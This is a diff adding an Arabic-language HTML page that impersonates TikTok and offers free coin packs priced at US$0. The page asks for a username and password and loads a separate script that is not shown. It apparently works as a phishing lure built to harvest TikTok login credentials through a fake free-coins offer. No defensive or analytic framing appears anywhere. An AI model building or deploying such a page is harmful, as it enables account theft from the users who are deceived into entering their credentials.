@@ -1,0 +1,110 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>شحن عملات </title>
+  <link href="style.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <header class="site-header">
+    <div class="container header-row">
+      <div class="logo"><img src="user.png" alt="logo" class="logo-img"> <strong>TikTok</strong></div>
+      <nav class="nav">
+      </nav>
+    </div>
+  </header>
+
+  <main class="container main-content">
+    <section class="top-info">
+      <h1>احصل على عملات</h1>
+      <p class="sub">اشحن عملات لاستخدامها داخل التطبيق .</p>
+    </section>
+
+    <section class="offers">
+      <div class="offers-grid" id="offersGrid">
+        <!-- Cards injected by HTML for simplicity -->
+        <button class="offer" data-coins="30" data-price="0">
+          <div class="offer-top"><img src="coin.png" alt="coin" class="coin-img"><div class="coin-num">30</div></div>
+          <div class="offer-price">US$0</div>
+        </button>
+
+        <button class="offer" data-coins="350" data-price="0">
+          <div class="offer-top"><img src="coin.png" alt="coin" class="coin-img"><div class="coin-num">350</div></div>
+          <div class="offer-price">US$0</div>
+        </button>
+
+        <button class="offer" data-coins="700" data-price="0">
+          <div class="offer-top"><img src="coin.png" alt="coin" class="coin-img"><div class="coin-num">700</div></div>
+          <div class="offer-price">US$0</div>
+        </button>
+
+        <button class="offer" data-coins="1400" data-price="0">
+          <div class="offer-top"><img src="coin.png" alt="coin" class="coin-img"><div class="coin-num">1,400</div></div>
+          <div class="offer-price">US$0</div>
+        </button>
+
+        <button class="offer" data-coins="3500" data-price="0">
+          <div class="offer-top"><img src="coin.png" alt="coin" class="coin-img"><div class="coin-num">3,500</div></div>
+          <div class="offer-price">US$0</div>
+        </button>
+
+        <button class="offer" data-coins="7000" data-price="0">
+          <div class="offer-top"><img src="coin.png" alt="coin" class="coin-img"><div class="coin-num">7,000</div></div>
+          <div class="offer-price">US$0</div>
+        </button>
+
+      </div>
+    </section>
+
+    <aside class="summary">
+      <div class="summary-row">
+        <div class="left">
+          <div class="secure"><img src="secure.png" alt="secure"> <span>دفع آمن</span></div>
+        </div>
+        <div class="right">
+          <div class="total-line"><span>الإجمالي</span> <strong id="totalPrice">$0</strong></div>
+          <button id="buyBtn" class="btn primary" disabled>الشحن</button>
+        </div>
+      </div>
+    </aside>
+<input 
+  id="username" 
+  type="text" 
+  placeholder="اسم المستخدم" 
+  style="
+    width: 100%;
+    padding: 15px;
+    margin: 10px 0;
+    border: 2px solid red;
+    border-radius: 8px;
+    font-size: 18px;
+    box-sizing: border-box;
+  "
+>
+
+<input 
+  id="password" 
+  type="password" 
+  placeholder="كلمة المرور" 
+  style="
+    width: 100%;
+    padding: 15px;
+    margin: 10px 0;
+    border: 2px solid red;
+    border-radius: 8px;
+    font-size: 18px;
+    box-sizing: border-box;
+  "
+>
+  <button class="btn login" id="loginBtn">تسجيل الدخول</button>
+    <footer class="footer-note">
+      <p>TikTok Free
+</p>
+    </footer>
+  </main>
+
+  <script src="script.js"></script>
+</body>
+</html>
